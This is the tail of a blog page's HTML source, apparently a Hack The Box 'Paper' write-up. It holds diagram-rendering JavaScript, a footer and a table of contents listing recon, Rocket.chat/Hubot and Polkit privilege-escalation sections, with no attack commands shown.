              var myChart = new Chart(ctx, source);
              console.log(source);
              index += 1;
            });
          }

          if (lib && lib.includes('wavedrom')) {
            var wavePrefix = "language-wave";
            var index = 0;
            var jsonContent = null;

            Array.prototype.forEach.call(document.querySelectorAll("[class^=" + wavePrefix + "]"), function (x) {
              x.style.display = 'none'
              x.parentNode.style.backgroundColor = "transparent"
              jsonContent = x.innerText;
              var node0 = document.createElement('div');
              var source = null;
              node0.id = 'WaveDrom_Display_' + index;
              source = JSON.parse(jsonContent);
              x.parentNode.insertBefore(node0, x);
              WaveDrom.RenderWaveForm(index, source, "WaveDrom_Display_");
              index += 1;
            });
          }

          if (lib && lib.includes('viz')) {
            var vizPrefix = "language-viz-";
            Array.prototype.forEach.call(document.querySelectorAll("[class^=" + vizPrefix + "]"), function (x) {
              x.style.display = 'none'
              x.parentNode.style.backgroundColor = "transparent"
              var engine;
              x.getAttribute("class").split(" ").forEach(function (cls) {
                if (cls.startsWith(vizPrefix)) {
                  engine = cls.substr(vizPrefix.length);
                }
              });
              var viz = new Viz();
              viz.renderSVGElement(x.innerText, {
                  engine: engine
                })
                .then(function (element) {
                  element.style.width = "100%";
                  x.parentNode.insertBefore(element, x);
                })
            });
          }

        }
      </script>

      <footer class="footer">
        <div class="footer__social">
        </div>

        <div id="gtt">
          <div class="gtt">
            <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24">
              <path fill="currentColor"
                d="M8.12 14.71L12 10.83l3.88 3.88c.39.39 1.02.39 1.41 0 .39-.39.39-1.02 0-1.41L12.7 8.71c-.39-.39-1.02-.39-1.41 0L6.7 13.3c-.39.39-.39 1.02 0 1.41.39.38 1.03.39 1.42 0z" />
            </svg>
          </div>
        </div>

        <hr>

        <div class="footer__poweredby">
          <p class="caption">©2022, All Rights Reserved</p>
          <p class="caption">⌾⃝/ _ \⌾⃝</p>
        </div>
      </footer>

      <script>
        var a = document.getElementsByClassName('navbar__menu-item')
        var n = 0;
        for (var i = 1; i < a.length; i++) {
          n += i;
          a[i].classList.add("glitch_navbar");
          a[i].style = "--content: '" + a[i].textContent.replace(/\s/g, '') + "';"
        }
      </script>

    </div>

    <div class="wrapper__right hide" data-pad="true" dir="ltr">
      <script>
        document.querySelector('.wrapper__right').classList.remove('hide')
      </script>

      <div class="toc__flexbox--outer" data-position="fixed" data-dir="ltr" data-ani="true">
        <h6 class="toc__title toc__title--outer" data-ani="true">

          <a href="#title__single">HTB: Paper</a>

        </h6>

        <label class="switch" data-ani="true">
          <input id="visible-toc" aria-label="Visible TOC" type="checkbox" checked>
          <span class="slider round"></span>
        </label>

      </div>
      <div class="toc toc__outer " data-dir="ltr" data-folding="false" data-ani="true">
        <nav id="TableOfContents">
          <ul>
            <li><a href="#recon">Recon</a>
              <ul>
                <li><a href="#nmap">nmap</a></li>
                <li><a href="#web-site">Web Site</a></li>
                <li><a href="#wpscan">Wpscan</a></li>
                <li><a href="#wordpress">WordPress</a></li>
              </ul>
            </li>
            <li><a href="#user---dwight">User - Dwight</a>
              <ul>
                <li><a href="#rocketchat">Rocket.chat</a></li>
                <li><a href="#hubot">Hubot</a></li>
                <li><a href="#shell">Shell</a></li>
              </ul>
            </li>
            <li><a href="#privesc">Privesc</a>
              <ul>
                <li><a href="#polkit">Polkit</a></li>
                <li><a href="#shell-1">Shell</a></li>
                <li><a href="#hubot-cronjob">Hubot, Cronjob</a></li>
              </ul>
            </li>
          </ul>
        </nav>
      </div>
    </div>
  </div>
</body>

</html>

<!-- Thanks to
https://www.codegrepper.com/code-examples/whatever/how+to+remove+empty+lines+in+visual+studio 
-->